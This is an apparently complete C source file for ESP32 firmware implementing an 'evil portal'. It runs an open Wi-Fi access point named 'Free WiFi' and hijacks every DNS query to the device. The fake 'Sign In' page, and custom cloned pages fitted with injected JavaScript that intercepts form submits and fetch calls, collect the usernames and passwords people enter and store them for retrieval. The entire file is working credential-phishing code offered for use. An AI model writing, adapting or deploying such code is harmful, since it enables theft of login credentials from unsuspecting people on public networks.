#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "lwip/sockets.h"
#include "evil_portal.h"

static const char *TAG = "evil_portal";

/* ---- Credential storage ---- */
#define MAX_CREDS     16
#define MAX_CRED_LEN  48

typedef struct {
    char username[MAX_CRED_LEN];
    char password[MAX_CRED_LEN];
} cred_entry_t;

static cred_entry_t cred_store[MAX_CREDS];
static uint8_t cred_count = 0;
static uint8_t cred_read_idx = 0;

/* ---- State ---- */
static httpd_handle_t http_server = NULL;
static TaskHandle_t dns_task_handle = NULL;
static volatile bool portal_running = false;
static esp_netif_t *ap_netif = NULL;
static char active_portal_ssid[33] = "M1-Portal";

/* ---- Captive portal HTML ---- */
#define PORTAL_HTML_MAX 32768

static const char portal_html[] =
    "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Login</title>"
    "<style>"
    "body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f0f0}"
    ".box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15);width:300px}"
    "h2{margin:0;color:#333}.net{font-size:13px;color:#666;margin:6px 0 14px;word-break:break-word}"
    "input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
    "button{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}"
    "button:hover{background:#357abd}"
    "</style></head><body>"
    "<div class='box'><h2>Sign In</h2><div class='net'>{{SSID}}</div>"
    "<form method='POST' action='/login'>"
    "<input name='user' placeholder='Email or username' required>"
    "<input name='pass' type='password' placeholder='Password' required>"
    "<button type='submit'>Sign In</button>"
    "</form></div></body></html>";

static const char success_html[] =
    "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
    "<h2>Connected</h2><p>You are now online.</p></body></html>";

static char custom_portal_html[PORTAL_HTML_MAX + 1];
static size_t custom_portal_html_len = 0;

static const char portal_capture_js[] =
    "<script>(function(){if(window.__m1cap)return;window.__m1cap=1;"
    "function send(b,h){try{fetch('/login',{method:'POST',body:b,headers:h||{},keepalive:true});}catch(e){}}"
    "function add(p,k,v){if(v!==undefined&&v!==null&&v!=='')p.append(k,v);}"
    "function cap(f){try{var p=new URLSearchParams(),fd=new FormData(f);"
    "fd.forEach(function(v,k){add(p,k,v);});"
    "var pass=f.querySelector('input[type=password]');"
    "if(pass){add(p,'password',pass.value);"
    "var u=f.querySelector('input[name=user],input[name=username],input[name=email],input[name=ssid],input[type=email],input[type=text]');"
    "if(u)add(p,'user',u.value);}if(p.toString())send(p);}catch(e){}}"
    "document.addEventListener('submit',function(e){var f=e.target;setTimeout(function(){if(e.defaultPrevented)cap(f);},0);},true);"
    "var of=window.fetch;if(of)window.fetch=function(i,n){try{var m=(n&&n.method)||'',b=n&&n.body,h=n&&n.headers;"
    "if(String(m).toUpperCase()==='POST'&&b&&String(i).indexOf('/login')<0)send(b,h);}catch(e){}return of.apply(this,arguments);};"
    "})();</script>";

/* ---- HTTP handlers ---- */

static void html_escape_copy(char *dst, size_t dst_len, const char *src)
{
    size_t di = 0;
    if (!dst || dst_len == 0) return;
    if (!src) src = "";

    for (size_t si = 0; src[si] && di + 1 < dst_len; si++) {
        const char *entity = NULL;
        switch (src[si]) {
        case '&': entity = "&amp;"; break;
        case '<': entity = "&lt;"; break;
        case '>': entity = "&gt;"; break;
        case '"': entity = "&quot;"; break;
        case '\'': entity = "&#39;"; break;
        default: break;
        }

        if (entity) {
            size_t entity_len = strlen(entity);
            if (di + entity_len >= dst_len) break;
            memcpy(&dst[di], entity, entity_len);
            di += entity_len;
        } else {
            dst[di++] = src[si];
        }
    }
    dst[di] = '\0';
}

static char ascii_lower_char(char c)
{
    if (c >= 'A' && c <= 'Z') return (char)(c - 'A' + 'a');
    return c;
}

static const char *find_html_literal_ci(const char *html, size_t html_len, const char *needle)
{
    size_t needle_len = strlen(needle);
    if (!html || !needle || needle_len == 0 || html_len < needle_len) return NULL;

    for (size_t i = 0; i <= html_len - needle_len; i++) {
        bool match = true;
        for (size_t j = 0; j < needle_len; j++) {
            if (ascii_lower_char(html[i + j]) != ascii_lower_char(needle[j])) {
                match = false;
                break;
            }
        }
        if (match) return &html[i];
    }

    return NULL;
}

static esp_err_t send_html_segment_with_ssid(httpd_req_t *req, const char *html, size_t html_len,
                                             const char *escaped_ssid)
{
    static const char placeholder[] = "{{SSID}}";
    const char *pos = html;
    const char *end = html + html_len;
    const char *match;

    while (pos < end && (match = strstr(pos, placeholder)) != NULL && match < end) {
        httpd_resp_send_chunk(req, pos, match - pos);
        httpd_resp_send_chunk(req, escaped_ssid, HTTPD_RESP_USE_STRLEN);
        pos = match + sizeof(placeholder) - 1;
    }

    if (pos < end) {
        httpd_resp_send_chunk(req, pos, end - pos);
    }
    return ESP_OK;
}

static esp_err_t send_html_with_ssid(httpd_req_t *req, const char *html, size_t html_len, bool inject_capture)
{
    char escaped_ssid[sizeof(active_portal_ssid) * 6];
    const char *inject_at = NULL;

    html_escape_copy(escaped_ssid, sizeof(escaped_ssid), active_portal_ssid);
    httpd_resp_set_type(req, "text/html");

    if (inject_capture) {
        inject_at = find_html_literal_ci(html, html_len, "</body>");
    }

    if (inject_at) {
        send_html_segment_with_ssid(req, html, inject_at - html, escaped_ssid);
        httpd_resp_send_chunk(req, portal_capture_js, sizeof(portal_capture_js) - 1);
        send_html_segment_with_ssid(req, inject_at, html_len - (size_t)(inject_at - html), escaped_ssid);
    } else {
        send_html_segment_with_ssid(req, html, html_len, escaped_ssid);
        if (inject_capture) {
            httpd_resp_send_chunk(req, portal_capture_js, sizeof(portal_capture_js) - 1);
        }
    }

    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}

static int hex_value(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return -1;
}

static void url_decode_copy(char *dst, size_t dst_len, const char *src, size_t src_len)
{
    size_t di = 0;
    for (size_t si = 0; si < src_len && di + 1 < dst_len; si++) {
        if (src[si] == '+') {
            dst[di++] = ' ';
        } else if (src[si] == '%' && si + 2 < src_len) {
            int hi = hex_value(src[si + 1]);
            int lo = hex_value(src[si + 2]);
            if (hi >= 0 && lo >= 0) {
                dst[di++] = (char)((hi << 4) | lo);
                si += 2;
            } else {
                dst[di++] = src[si];
            }
        } else {
            dst[di++] = src[si];
        }
    }
    dst[di] = '\0';
}

static bool extract_form_value(const char *body, const char *const *keys, size_t key_count,
                               char *out, size_t out_len)
{
    if (!body || !out || out_len == 0) return false;

    for (size_t i = 0; i < key_count; i++) {
        const char *p = body;
        size_t key_len = strlen(keys[i]);
        while ((p = strstr(p, keys[i])) != NULL) {
            bool at_field_start = (p == body || p[-1] == '&' || p[-1] == '?');
            if (at_field_start && p[key_len] == '=') {
                const char *value = p + key_len + 1;
                const char *end = strchr(value, '&');
                size_t value_len = end ? (size_t)(end - value) : strlen(value);
                url_decode_copy(out, out_len, value, value_len);
                return true;
            }
            p += key_len;
        }
    }
    return false;
}

static bool extract_json_value(const char *body, const char *const *keys, size_t key_count,
                               char *out, size_t out_len)
{
    if (!body || !out || out_len == 0) return false;

    for (size_t i = 0; i < key_count; i++) {
        char pattern[24];
        snprintf(pattern, sizeof(pattern), "\"%s\"", keys[i]);
        const char *p = strstr(body, pattern);
        if (!p) continue;

        p += strlen(pattern);
        while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
        if (*p != ':') continue;
        p++;
        while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
        if (*p != '"') continue;
        p++;

        size_t di = 0;
        while (*p && *p != '"' && di + 1 < out_len) {
            if (*p == '\\' && p[1]) {
                p++;
            }
            out[di++] = *p++;
        }
        out[di] = '\0';
        return true;
    }

    return false;
}

static esp_err_t root_get_handler(httpd_req_t *req)
{
    if (custom_portal_html_len > 0) {
        return send_html_with_ssid(req, custom_portal_html, custom_portal_html_len, true);
    }
    return send_html_with_ssid(req, portal_html, sizeof(portal_html) - 1, false);
}

static esp_err_t login_post_handler(httpd_req_t *req)
{
    char buf[512];
    char content_type[48] = {0};
    bool is_json = false;
    int remaining = req->content_len;
    int used = 0;

    if (httpd_req_get_hdr_value_str(req, "Content-Type", content_type, sizeof(content_type)) == ESP_OK) {
        is_json = (strstr(content_type, "json") != NULL || strstr(content_type, "JSON") != NULL);
    }
    if (strstr(req->uri, "JSON") || strstr(req->uri, "json")) {
        is_json = true;
    }

    while (remaining > 0 && used < (int)sizeof(buf) - 1) {
        int room = (int)sizeof(buf) - 1 - used;
        int wanted = remaining < room ? remaining : room;
        int ret = httpd_req_recv(req, buf + used, wanted);
        if (ret <= 0) {
            httpd_resp_send_408(req);
            return ESP_FAIL;
        }
        used += ret;
        remaining -= ret;
    }
    buf[used] = '\0';

    while (remaining > 0) {
        char discard[64];
        int wanted = remaining < (int)sizeof(discard) ? remaining : (int)sizeof(discard);
        int ret = httpd_req_recv(req, discard, wanted);
        if (ret <= 0) break;
        remaining -= ret;
    }

    /* Accept common custom form names, not just the built-in user/pass pair. */
    {
        cred_entry_t parsed;
        static const char *const user_keys[] = {
            "user", "username", "email", "login", "identity",
            "ssid", "wifi", "wifi_name", "network", "network_name"
        };
        static const char *const pass_keys[] = { "pass", "password", "pwd" };
        memset(&parsed, 0, sizeof(parsed));

        if (is_json) {
            extract_json_value(buf, user_keys, sizeof(user_keys) / sizeof(user_keys[0]),
                               parsed.username, sizeof(parsed.username));
            extract_json_value(buf, pass_keys, sizeof(pass_keys) / sizeof(pass_keys[0]),
                               parsed.password, sizeof(parsed.password));
        } else {
            extract_form_value(buf, user_keys, sizeof(user_keys) / sizeof(user_keys[0]),
                               parsed.username, sizeof(parsed.username));
            extract_form_value(buf, pass_keys, sizeof(pass_keys) / sizeof(pass_keys[0]),
                               parsed.password, sizeof(parsed.password));
        }

        bool has_value = parsed.username[0] || parsed.password[0];
        bool duplicate = false;
        if (has_value && cred_count > 0) {
            cred_entry_t *last = &cred_store[cred_count - 1];
            duplicate = strcmp(last->username, parsed.username) == 0 &&
                        strcmp(last->password, parsed.password) == 0;
        }

        if (has_value && !duplicate && cred_count < MAX_CREDS) {
            cred_store[cred_count] = parsed;
            ESP_LOGI(TAG, "Captured cred #%d: user=%s", cred_count, parsed.username);
            cred_count++;
        }
    }

    if (is_json) {
        static const char json_ok[] = "{\"ok\":true}";
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, json_ok, sizeof(json_ok) - 1);
    } else {
        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, success_html, sizeof(success_html) - 1);
    }
    return ESP_OK;
}

/* Catch-all handler — redirect everything to root (captive portal trigger) */
static esp_err_t catchall_handler(httpd_req_t *req)
{
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/* ---- DNS hijack ---- */

static void dns_hijack_task(void *arg)
{
    (void)arg;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(TAG, "DNS socket failed");
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    /* Our AP IP: 192.168.4.1 */
    uint8_t ap_ip[4] = {192, 168, 4, 1};

    uint8_t rx[512], tx[512];
    struct sockaddr_in client;
    socklen_t client_len;

    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    while (portal_running) {
        client_len = sizeof(client);
        int len = recvfrom(sock, rx, sizeof(rx), 0, (struct sockaddr *)&client, &client_len);
        if (len < 12) continue; /* too short for DNS header */

        /* Build minimal DNS response:
         * Copy ID + flags, set QR=1 (response), ANCOUNT=1
         * Append the original question, then a single A record answer */
        memcpy(tx, rx, len);

        /* Set QR=1, Opcode=0, AA=1, TC=0, RD=1, RA=1, RCODE=0 */
        tx[2] = 0x81;
        tx[3] = 0x80;
        /* ANCOUNT = 1 */
        tx[6] = 0x00;
        tx[7] = 0x01;

        int pos = len;
        /* Answer: pointer to question name (0xC00C), type A, class IN, TTL=60, rdlength=4, IP */
        tx[pos++] = 0xC0; tx[pos++] = 0x0C;  /* name pointer */
        tx[pos++] = 0x00; tx[pos++] = 0x01;   /* type A */
        tx[pos++] = 0x00; tx[pos++] = 0x01;   /* class IN */
        tx[pos++] = 0x00; tx[pos++] = 0x00; tx[pos++] = 0x00; tx[pos++] = 0x3C; /* TTL 60s */
        tx[pos++] = 0x00; tx[pos++] = 0x04;   /* rdlength */
        memcpy(&tx[pos], ap_ip, 4);
        pos += 4;

        sendto(sock, tx, pos, 0, (struct sockaddr *)&client, client_len);
    }

    close(sock);
    ESP_LOGI(TAG, "DNS hijack stopped");
    vTaskDelete(NULL);
}

/* ---- Public API ---- */

void portal_init(void)
{
    /* Created on demand */
}

bool portal_prepare_ap(const char *ssid, uint8_t channel)
{
    if (!ap_netif) {
        ap_netif = esp_netif_create_default_wifi_ap();
    }

    wifi_config_t ap_cfg = {
        .ap = {
            .channel = channel,
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN,
        },
    };
    strncpy((char *)ap_cfg.ap.ssid, ssid, sizeof(ap_cfg.ap.ssid));
    ap_cfg.ap.ssid_len = strlen(ssid);
    portal_set_active_ssid(ssid);

    if (esp_wifi_set_mode(WIFI_MODE_APSTA) != ESP_OK) {
        return false;
    }
    if (esp_wifi_set_config(WIFI_IF_AP, &ap_cfg) != ESP_OK) {
        return false;
    }

    return true;
}

void portal_set_active_ssid(const char *ssid)
{
    if (!ssid || !ssid[0]) {
        return;
    }
    strncpy(active_portal_ssid, ssid, sizeof(active_portal_ssid) - 1);
    active_portal_ssid[sizeof(active_portal_ssid) - 1] = '\0';
}

bool portal_services_start(bool reset_creds)
{
    if (portal_running) {
        return false;
    }

    if (reset_creds) {
        cred_count = 0;
        cred_read_idx = 0;
        memset(cred_store, 0, sizeof(cred_store));
    }

    httpd_config_t http_cfg = HTTPD_DEFAULT_CONFIG();
    http_cfg.uri_match_fn = httpd_uri_match_wildcard;

    if (httpd_start(&http_server, &http_cfg) == ESP_OK) {
        httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = root_get_handler };
        httpd_uri_t login = { .uri = "/login", .method = HTTP_POST, .handler = login_post_handler };
        httpd_uri_t post_any = { .uri = "/*", .method = HTTP_POST, .handler = login_post_handler };
        httpd_uri_t catchall = { .uri = "/*", .method = HTTP_GET, .handler = catchall_handler };
        httpd_register_uri_handler(http_server, &root);
        httpd_register_uri_handler(http_server, &login);
        httpd_register_uri_handler(http_server, &post_any);
        httpd_register_uri_handler(http_server, &catchall);
    } else {
        return false;
    }

    portal_running = true;
    xTaskCreate(dns_hijack_task, "dns_hijack", 4096, NULL, 5, &dns_task_handle);
    return true;
}

void portal_services_stop(bool restore_sta)
{
    portal_running = false;

    if (http_server) {
        httpd_stop(http_server);
        http_server = NULL;
    }

    /* DNS task will exit on its own when portal_running == false */
    dns_task_handle = NULL;

    /* Restore STA-only mode */
    if (restore_sta) {
        esp_wifi_set_mode(WIFI_MODE_STA);
    }
}

void portal_start(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    if (portal_running) {
        resp->status = RESP_BUSY;
        return;
    }

    /* Optional SSID in payload, default "Free WiFi" */
    char ssid[33] = "Free WiFi";
    if (cmd->payload_len > 0 && cmd->payload_len <= 32) {
        memcpy(ssid, cmd->payload, cmd->payload_len);
        ssid[cmd->payload_len] = '\0';
    }

    if (!portal_prepare_ap(ssid, 1) || !portal_services_start(true)) {
        resp->status = RESP_ERR;
        return;
    }

    ESP_LOGI(TAG, "Evil portal started: SSID='%s'", ssid);
    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void portal_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;

    portal_services_stop(true);

    ESP_LOGI(TAG, "Evil portal stopped, captured %d creds", cred_count);
    resp->status = RESP_OK;
    resp->payload[0] = cred_count;
    resp->payload_len = 1;
}

void portal_get_creds(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;

    if (cred_read_idx >= cred_count) {
        resp->status = RESP_OK;
        resp->payload[0] = 0; /* no more creds */
        resp->payload_len = 1;
        return;
    }

    cred_entry_t *c = &cred_store[cred_read_idx++];

    /* Pack: [0] user_len, [1..] user, [N] pass_len, [N+1..] pass */
    uint8_t ulen = (uint8_t)strnlen(c->username, MAX_CRED_LEN);
    uint8_t plen = (uint8_t)strnlen(c->password, MAX_CRED_LEN);

    /* Clamp to fit payload */
    if (1 + ulen + 1 + plen > M1_MAX_PAYLOAD) {
        if (ulen > 24) ulen = 24;
        if (plen > 24) plen = 24;
    }

    uint8_t pos = 0;
    resp->payload[pos++] = ulen;
    memcpy(&resp->payload[pos], c->username, ulen);
    pos += ulen;
    resp->payload[pos++] = plen;
    memcpy(&resp->payload[pos], c->password, plen);
    pos += plen;

    resp->payload_len = pos;
    resp->status = RESP_OK;
}

void portal_html_clear(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;

    custom_portal_html_len = 0;
    custom_portal_html[0] = '\0';

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void portal_html_add(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    if (cmd->payload_len == 0) {
        resp->status = RESP_OK;
        resp->payload_len = 0;
        return;
    }

    if (custom_portal_html_len + cmd->payload_len > PORTAL_HTML_MAX) {
        resp->status = RESP_ERR;
        return;
    }

    memcpy(&custom_portal_html[custom_portal_html_len], cmd->payload, cmd->payload_len);
    custom_portal_html_len += cmd->payload_len;
    custom_portal_html[custom_portal_html_len] = '\0';

    resp->payload[0] = (uint8_t)(custom_portal_html_len & 0xFF);
    resp->payload[1] = (uint8_t)(custom_portal_html_len >> 8);
    resp->payload_len = 2;
    resp->status = RESP_OK;
}
